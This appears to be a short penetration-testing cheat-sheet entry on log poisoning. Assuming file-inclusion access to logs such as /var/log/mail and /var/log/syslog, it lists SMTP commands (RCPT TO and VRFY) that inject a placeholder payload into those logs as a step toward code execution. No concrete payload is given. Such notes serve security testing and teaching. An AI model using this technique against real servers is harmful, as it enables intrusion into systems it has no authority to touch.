## Log poisoning

Given that we have found a way to access log file (eg. LFI) directories such as:

```
/var/log/mail
/var/log/syslog
```

There are some commands that may allow us to have our input directly appear in the logs:

#### 1. RCPT TO

```sh
RCPT TO:<payload>
```

#### 2. VRFY

```sh
VRFY <payload>
```
